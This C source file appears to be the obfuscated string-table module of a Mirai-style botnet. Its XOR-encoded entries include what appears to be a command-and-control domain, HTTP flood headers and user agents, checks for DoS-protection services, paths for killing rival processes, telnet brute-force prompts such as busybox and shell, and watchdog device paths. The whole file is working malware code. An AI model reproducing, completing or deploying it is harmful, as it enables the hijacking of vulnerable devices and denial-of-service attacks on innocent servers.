#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "headers/includes.h"
#include "headers/table.h"
#include "headers/util.h"

uint32_t table_key = 0xd3adf00d;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_DOMAIN, "\xE0\xEF\xEC\xF4\xED\xF0\xE6\xE0\xAD\xF1\xF6\x83", 12);
    add_entry(TABLE_EXEC_SUCCESS, "\xE8\xE6\xE1\xE2\xE1\xF4\xE2\xF1\xE6\xA3\xEA\xED\xF0\xF7\xE2\xEF\xEF\xE6\xE7\x83", 20);
    
    add_entry(TABLE_ATK_KEEP_ALIVE, "\xC0\xEC\xED\xED\xE6\xE0\xF7\xEA\xEC\xED\xB9\xA3\xE8\xE6\xE6\xF3\xAE\xE2\xEF\xEA\xF5\xE6\x83", 23);
    add_entry(TABLE_ATK_ACCEPT, "\xC2\xE0\xE0\xE6\xF3\xF7\xB9\xA3\xF7\xE6\xFB\xF7\xAC\xEB\xF7\xEE\xEF\xAF\xE2\xF3\xF3\xEF\xEA\xE0\xE2\xF7\xEA\xEC\xED\xAC\xFB\xEB\xF7\xEE\xEF\xA8\xFB\xEE\xEF\xAF\xE2\xF3\xF3\xEF\xEA\xE0\xE2\xF7\xEA\xEC\xED\xAC\xFB\xEE\xEF\xB8\xF2\xBE\xB3\xAD\xBA\xAF\xEA\xEE\xE2\xE4\xE6\xAC\xF4\xE6\xE1\xF3\xAF\xA9\xAC\xA9\xB8\xF2\xBE\xB3\xAD\xBB\x83", 83);
    add_entry(TABLE_ATK_ACCEPT_LNG, "\xC2\xE0\xE0\xE6\xF3\xF7\xAE\xCF\xE2\xED\xE4\xF6\xE2\xE4\xE6\xB9\xA3\xE6\xED\xAE\xD6\xD0\xAF\xE6\xED\xB8\xF2\xBE\xB3\xAD\xBB\x83", 32);
    add_entry(TABLE_ATK_CONTENT_TYPE, "\xC0\xEC\xED\xF7\xE6\xED\xF7\xAE\xD7\xFA\xF3\xE6\xB9\xA3\xE2\xF3\xF3\xEF\xEA\xE0\xE2\xF7\xEA\xEC\xED\xAC\xFB\xAE\xF4\xF4\xF4\xAE\xE5\xEC\xF1\xEE\xAE\xF6\xF1\xEF\xE6\xED\xE0\xEC\xE7\xE6\xE7\x83", 48);
    add_entry(TABLE_ATK_SET_COOKIE, "\xF0\xE6\xF7\xC0\xEC\xEC\xE8\xEA\xE6\xAB\xA4\x83", 12);
    add_entry(TABLE_ATK_REFRESH_HDR, "\xF1\xE6\xE5\xF1\xE6\xF0\xEB\xB9\x83", 9);
    add_entry(TABLE_ATK_LOCATION_HDR, "\xEF\xEC\xE0\xE2\xF7\xEA\xEC\xED\xB9\x83", 10);
    add_entry(TABLE_ATK_SET_COOKIE_HDR, "\xF0\xE6\xF7\xAE\xE0\xEC\xEC\xE8\xEA\xE6\xB9\x83", 12);
    add_entry(TABLE_ATK_CONTENT_LENGTH_HDR, "\xE0\xEC\xED\xF7\xE6\xED\xF7\xAE\xEF\xE6\xED\xE4\xF7\xEB\xB9\x83", 16);
    add_entry(TABLE_ATK_TRANSFER_ENCODING_HDR, "\xF7\xF1\xE2\xED\xF0\xE5\xE6\xF1\xAE\xE6\xED\xE0\xEC\xE7\xEA\xED\xE4\xB9\x83", 19);
    add_entry(TABLE_ATK_CHUNKED, "\xE0\xEB\xF6\xED\xE8\xE6\xE7\x83", 8);
    add_entry(TABLE_ATK_KEEP_ALIVE_HDR, "\xE8\xE6\xE6\xF3\xAE\xE2\xEF\xEA\xF5\xE6\x83", 11);
    add_entry(TABLE_ATK_CONNECTION_HDR, "\xE0\xEC\xED\xED\xE6\xE0\xF7\xEA\xEC\xED\xB9\x83", 12);
    add_entry(TABLE_ATK_DOSARREST, "\xF0\xE6\xF1\xF5\xE6\xF1\xB9\xA3\xE7\xEC\xF0\xE2\xF1\xF1\xE6\xF0\xF7\x83", 18);
    add_entry(TABLE_ATK_CLOUDFLARE_NGINX, "\xF0\xE6\xF1\xF5\xE6\xF1\xB9\xA3\xE0\xEF\xEC\xF6\xE7\xE5\xEF\xE2\xF1\xE6\xAE\xED\xE4\xEA\xED\xFB\x83", 25);

    add_entry(TABLE_KILLER_PROC, "\xAC\xF3\xF1\xEC\xE0\xAC\x83", 7);
    add_entry(TABLE_KILLER_EXE, "\xAC\xE6\xFB\xE6\x83", 5);
    add_entry(TABLE_KILLER_FD, "\xAC\xE5\xE7\x83", 4);
	add_entry(TABLE_KILLER_TCP, "\xAC\xF3\xF1\xEC\xE0\xAC\xED\xE6\xF7\xAC\xF7\xE0\xF3\x83", 14); 
	add_entry(TABLE_KILLER_MAPS, "\xAC\xEE\xE2\xF3\xF0\x83", 6); 
	add_entry(TABLE_MEM_ROUTE, "\xAC\xF3\xF1\xEC\xE0\xAC\xED\xE6\xF7\xAC\xF1\xEC\xF6\xF7\xE6\x83", 16); 
	add_entry(TABLE_MEM_ASSWORD, "\xE2\xF0\xF0\xF4\xEC\xF1\xE7\x83", 8); 
	add_entry(TABLE_KILLER_STATUS, "\xAC\xF0\xF7\xE2\xF7\xF6\xF0\x83", 8); 

    add_entry(TABLE_SCAN_OGIN, "\xEC\xE4\xEA\xED\x83", 5);
    add_entry(TABLE_SCAN_ENTER, "\xE6\xED\xF7\xE6\xF1\x83", 6);
    add_entry(TABLE_SCAN_ASSWORD, "\xE2\xF0\xF0\xF4\xEC\xF1\xE7\x83", 8);
    add_entry(TABLE_SCAN_QUERY, "\xAC\xE1\xEA\xED\xAC\xE1\xF6\xF0\xFA\xE1\xEC\xFB\xA3\xD7\xF0\xF6\xED\xE2\xEE\xEA\x83", 21);
    add_entry(TABLE_SCAN_RESP, "\xD7\xF0\xF6\xED\xE2\xEE\xEA\xB9\xA3\xE2\xF3\xF3\xEF\xE6\xF7\xA3\xED\xEC\xF7\xA3\xE5\xEC\xF6\xED\xE7\x83", 26);
    add_entry(TABLE_SCAN_NCORRECT, "\xED\xE0\xEC\xF1\xF1\xE6\xE0\xF7\x83", 9);
    add_entry(TABLE_SCAN_ENABLE, "\xE6\xED\xE2\xE1\xEF\xE6\x83", 7);
    add_entry(TABLE_SCAN_SYSTEM, "\xF0\xFA\xF0\xF7\xE6\xEE\x83", 7);
    add_entry(TABLE_SCAN_SHELL, "\xF0\xEB\xE6\xEF\xEF\x83", 6);
    add_entry(TABLE_SCAN_SH, "\xF0\xEB\x83", 3);

	add_entry(TABLE_ATK_VSE, "\xD7\xD0\xEC\xF6\xF1\xE0\xE6\xA3\xC6\xED\xE4\xEA\xED\xE6\xA3\xD2\xF6\xE6\xF1\xFA\x83", 21); 
	add_entry(TABLE_ATK_RESOLVER, "\xAC\xE6\xF7\xE0\xAC\xF1\xE6\xF0\xEC\xEF\xF5\xAD\xE0\xEC\xED\xE5\x83", 17); 
	add_entry(TABLE_ATK_NSERV, "\xED\xE2\xEE\xE6\xF0\xE6\xF1\xF5\xE6\xF1\x83", 11);

    add_entry(TABLE_HTTP_ONE, "\xCF\xE6\xE6\xE0\xEB\xC0\xF1\xE2\xE5\xF7\xA3\xAB\xDB\xB2\xB2\xB8\xA3\xD6\xB8\xA3\xCF\xEA\xED\xF6\xFB\xB8\xA3\xF1\xF6\xDC\xD1\xD6\xAA\xA3\xAB\xCF\xE6\xE6\xE0\xEB\xC0\xF1\xE2\xE5\xF7\xAC\xD3\xEC\xF0\xEB\xF6\xE8\xF6\xA3\xB3\xAD\xB0\xAD\xB6\xB6\xAE\xB0\xB1\xB7\xAE\xE4\xBA\xB0\xB5\xB6\xE5\xB1\xB0\xB8\xA3\xD4\xE6\xE1\xC8\xEA\xF7\xA3\xB7\xAD\xB6\xAD\xB1\xAC\xB7\xAD\xB6\xAD\xB1\xAA\x83", 95);
    add_entry(TABLE_HTTP_TWO, "\xCE\xEC\xF9\xEA\xEF\xEF\xE2\xAC\xB6\xAD\xB3\xA3\xAB\xD4\xEA\xED\xE7\xEC\xF4\xF0\xB8\xA3\xD6\xB8\xA3\xD4\xEA\xED\xE7\xEC\xF4\xF0\xA3\xCD\xD7\xA3\xB6\xAD\xB2\xB8\xA3\xE6\xED\xAE\xD6\xD0\xB8\xA3\xF1\xF5\xB9\xB2\xAD\xBA\xAD\xB1\xAD\xB2\xB3\xAA\xA3\xC4\xE6\xE0\xE8\xEC\xAC\xB1\xB3\xB2\xB3\xB3\xBA\xB2\xB7\xA3\xC0\xEC\xED\xE8\xE6\xF1\xEC\xF1\xAC\xB3\xAD\xBA\xAD\xB0\x83", 91);
    add_entry(TABLE_HTTP_THREE, "\xCE\xEC\xF9\xEA\xEF\xEF\xE2\xAC\xB6\xAD\xB3\xA3\xAB\xD4\xEA\xED\xE7\xEC\xF4\xF0\xB8\xA3\xD6\xB8\xA3\xD4\xEA\xED\xE7\xEC\xF4\xF0\xA3\xCD\xD7\xA3\xB6\xAD\xB2\xB8\xA3\xE6\xED\xAE\xD6\xD0\xB8\xA3\xF1\xF5\xB9\xB2\xAD\xBA\xAA\xA3\xC4\xE6\xE0\xE8\xEC\xAC\xB1\xB3\xB3\xBB\xB2\xB1\xB3\xB2\xB1\xB3\xA3\xC1\xEF\xE2\xE0\xE8\xE1\xEA\xF1\xE7\xAC\xB3\xAD\xBA\xBA\xBA\xB2\x83", 90);
    add_entry(TABLE_HTTP_FOUR, "\xCE\xEC\xF9\xEA\xEF\xEF\xE2\xAC\xB7\xAD\xB3\xA3\xAB\xE0\xEC\xEE\xF3\xE2\xF7\xEA\xE1\xEF\xE6\xB8\xA3\xCE\xD0\xCA\xC6\xA3\xB5\xAD\xB3\xB8\xA3\xD4\xEA\xED\xE7\xEC\xF4\xF0\xA3\xDB\xD3\xA3\xB6\xAD\xB2\xAA\xA3\xCF\xEC\xE1\xEC\xAC\xB3\xAD\xBA\xBB\xAD\xB7\x83", 63);
    add_entry(TABLE_HTTP_FIVE, "\xCE\xEC\xF9\xEA\xEF\xEF\xE2\xAC\xB6\xAD\xB3\xA3\xAB\xEA\xD3\xEB\xEC\xED\xE6\xB8\xA3\xC0\xD3\xD6\xA3\xEA\xD3\xEB\xEC\xED\xE6\xA3\xCC\xD0\xA3\xB5\xDC\xB2\xDC\xB2\xA3\xEF\xEA\xE8\xE6\xA3\xCE\xE2\xE0\xA3\xCC\xD0\xA3\xDB\xAA\xA3\xC2\xF3\xF3\xEF\xE6\xD4\xE6\xE1\xC8\xEA\xF7\xAC\xB6\xB0\xB7\xAD\xB7\xB5\xA3\xAB\xC8\xCB\xD7\xCE\xCF\xAF\xA3\xEF\xEA\xE8\xE6\xA3\xC4\xE6\xE0\xE8\xEC\xAA\xA3\xD5\xE6\xF1\xF0\xEA\xEC\xED\xAC\xB6\xAD\xB2\xA3\xCE\xEC\xE1\xEA\xEF\xE6\xAC\xBA\xC1\xB1\xB3\xB5\xA3\xD0\xE2\xE5\xE2\xF1\xEA\xAC\xB4\xB6\xB0\xB7\xAD\xB7\xBB\xAD\xB0\x83", 137);

    add_entry(TABLE_ATK_HTTP, "\xCB\xD7\xD7\xD3\xAC\xB2\xAD\xB2\x83", 9);
    add_entry(TABLE_ATK_USERAGENT, "\xD6\xF0\xE6\xF1\xAE\xC2\xE4\xE6\xED\xF7\xB9\x83", 12);
    add_entry(TABLE_ATK_HOST, "\xCB\xEC\xF0\xF7\xB9\x83", 6);
    add_entry(TABLE_ATK_COOKIE, "\xC0\xEC\xEC\xE8\xEA\xE6\xB9\x83", 8);
    add_entry(TABLE_ATK_SEARCHHTTP, "\xEB\xF7\xF7\xF3\x83", 5);
    add_entry(TABLE_ATK_URL, "\xF6\xF1\xEF\xBE\x83", 5);
    add_entry(TABLE_ATK_POST, "\xD3\xCC\xD0\xD7\x83", 5);

    add_entry(TABLE_MISC_DOG, "\xAC\xE7\xE6\xF5\xAC\xF4\xE2\xF7\xE0\xEB\xE7\xEC\xE4\x83", 14);
    add_entry(TABLE_MISC_DOG1, "\xAC\xE7\xE6\xF5\xAC\xEE\xEA\xF0\xE0\xAC\xF4\xE2\xF7\xE0\xEB\xE7\xEC\xE4\x83", 19);
    add_entry(TABLE_MISC_DOG2, "\xAC\xE7\xE6\xF5\xAC\xC5\xD7\xD4\xC7\xD7\xB2\xB3\xB2\xDC\xF4\xE2\xF7\xE0\xEB\xE7\xEC\xE4\x83", 23);
    add_entry(TABLE_MISC_DOG3, "\xAC\xE7\xE6\xF5\xAC\xC5\xD7\xD4\xC7\xD7\xB2\xB3\xB2\xDF\xA3\xF4\xE2\xF7\xE0\xEB\xE7\xEC\xE4\x83", 24);
    add_entry(TABLE_MISC_DOG4, "\xAC\xE7\xE6\xF5\xAC\xF4\xE2\xF7\xE0\xEB\xE7\xEC\xE4\xB3\x83", 15);
    add_entry(TABLE_MISC_DOG5, "\xAC\xE6\xF7\xE0\xAC\xE7\xE6\xE5\xE2\xF6\xEF\xF7\xAC\xF4\xE2\xF7\xE0\xEB\xE7\xEC\xE4\x83", 22);
    add_entry(TABLE_MISC_DOG6, "\xAC\xF0\xE1\xEA\xED\xAC\xF4\xE2\xF7\xE0\xEB\xE7\xEC\xE4\x83", 15);	
    add_entry(TABLE_MISC_RAND, "\xEB\xE7\xFA\xF6\xE8\xBB\xB1\xF6\xF3\xEC\xE8\xEF\xEE\xB1\xBB\xEC\xE2\xB3\xEB\xED\xEE\xF6\xF2\xEA\xE4\xF5\xFB\xE9\xBA\xF3\xF2\x83", 32);
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
